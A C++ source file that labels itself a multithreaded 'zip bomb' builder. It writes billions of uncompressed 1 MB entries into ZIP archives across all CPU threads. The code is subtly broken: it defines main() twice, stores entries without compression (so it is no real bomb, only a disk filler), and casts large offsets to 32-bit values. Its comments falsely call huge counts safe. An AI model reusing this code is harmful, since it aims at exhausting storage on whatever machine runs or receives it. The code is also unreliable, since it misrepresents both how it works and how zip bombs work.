#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <thread>
#include <mutex>

#include "ZipInfo.h"
#include "crc32.h"
#include "metadata.h"

std::mutex consoleMutex;

void build_zip_bomb_thread(int threadId, long long filesPerThread);

void build_zip_bomb_thread(int threadId, long long filesPerThread) {
    std::string archiveName = "thread_payload_" + std::to_string(threadId) + ".zip";
    
    std::ofstream zipFile(archiveName, std::ios::binary);
    if (!zipFile) {
        std::lock_guard<std::mutex> lock(consoleMutex);
        std::cerr << "[Thread " << threadId << "] Error creating local master binary file!\n";
        return;
    }

    std::vector<FileMetadata> archiveTracker;

    // Define the core repeating payload block (1 Megabyte of raw data characters)
    std::string testPayload(1000000, '0'); 
    uint32_t computedCrc = calculate_crc32(testPayload);

    // --- STEP 1: CONCURRENT FILE SEQUENCE WRITE ---
    // We use 'long long' for the loop counter 'i' so it NEVER hits an integer overflow!
    for (long long i = 0; i < filesPerThread; ++i) {
        std::string customName = "t" + std::to_string(threadId) + "_layer_" + std::to_string(i) + ".txt";
        uint32_t activeOffset = static_cast<uint32_t>(zipFile.tellp());

        LocalFileHeader lfh;
        lfh.crc32 = computedCrc;
        lfh.compressedSize = testPayload.size();
        lfh.uncompressedSize = testPayload.size();
        lfh.fileNameLength = customName.size();

        zipFile.write(reinterpret_cast<const char*>(&lfh), sizeof(lfh));
        zipFile.write(customName.c_str(), customName.size());
        zipFile.write(testPayload.c_str(), testPayload.size());

        archiveTracker.push_back({customName, computedCrc, static_cast<uint32_t>(testPayload.size()), activeOffset});
    }

    // --- STEP 2: WRITE CENTRAL DIRECTORY MAPS ---
    uint32_t centralDirectoryMarker = static_cast<uint32_t>(zipFile.tellp());
    for (const auto& file : archiveTracker) {
        CentralDirectoryHeader cdh;
        cdh.crc32 = file.crc;
        cdh.compressedSize = file.size;
        cdh.uncompressedSize = file.size;
        cdh.fileNameLength = file.name.size();
        cdh.localHeaderOffset = file.byteOffset;

        zipFile.write(reinterpret_cast<const char*>(&cdh), sizeof(cdh));
        zipFile.write(file.name.c_str(), file.name.size());
    }

    uint32_t centralDirectoryByteSize = static_cast<uint32_t>(zipFile.tellp()) - centralDirectoryMarker;

    // --- STEP 3: STAMP END OF CENTRAL DIRECTORY (EOCD) ---
    EndOfCentralDirectory eocd;
    eocd.numberRecordsOnDisk = archiveTracker.size();
    eocd.totalRecords = archiveTracker.size();
    eocd.centralDirectorySize = centralDirectoryByteSize;
    eocd.centralDirectoryOffset = centralDirectoryMarker;

    zipFile.write(reinterpret_cast<const char*>(&eocd), sizeof(eocd));
    zipFile.close();

    {
        std::lock_guard<std::mutex> lock(consoleMutex);
        std::cout << "[Thread " << threadId << "] Successfully generated " << filesPerThread << " files sequentially.\n";
    }
}

int main() {
    // 1. Detect your hardware limits to deploy the exact maximum threads your CPU supports safely
    const unsigned int hardwareThreads = std::thread::hardware_concurrency();
    const unsigned int safeThreads = (hardwareThreads > 0) ? hardwareThreads : 8; // Fallback to 8 if detection fails
    
    // 2. Set your massive target total count using a 64-bit 'long long' literal (LL)
    // You can safely set this into the millions or billions now without crashing!
    const long long totalFilesToTarget = 100000000000LL; 
    
    // Divide the massive work evenly across your safe thread count
    long long filesPerThread = totalFilesToTarget / safeThreads;

    std::vector<std::thread> threadPool;

    std::cout << "========== CONCURRENT BLOCK INITIATED ==========\n";
    std::cout << "Deploying " << safeThreads << " safe CPU threads...\n";
    std::cout << "Each individual thread will process " << filesPerThread << " files sequentially.\n\n";

    // Launch the threads safely
    for (unsigned int i = 0; i < safeThreads; ++i) {
        threadPool.push_back(std::thread(build_zip_bomb_thread, i, filesPerThread));
    }

    // Await thread completion
    for (auto& t : threadPool) {
        if (t.joinable()) {
            t.join();
        }
    }

    std::cout << "\n========== TARGET TERMINATION COMPLETE ==========\n";
    return 0;
}

int main() {
    const unsigned int hardwareThreads = std::thread::hardware_concurrency();
    const unsigned int safeThreads = (hardwareThreads > 0) ? hardwareThreads : 8;

    const long long totalFilesToTarget = 100000000000LL;

    long long filesPerThread = totalFilesToTarget / safeThreads;

    std::vector<std::thread> threadPool;

    for (unsigned int i = 0; i < safeThreads; ++i) {
        threadPool.push_back(std::thread(build_zip_bomb_thread, i, filesPerThread));
    }

    for (auto& t : threadPool) {
        if (t.joinable()) {
            t.join();
        }
    }
    return 0;
}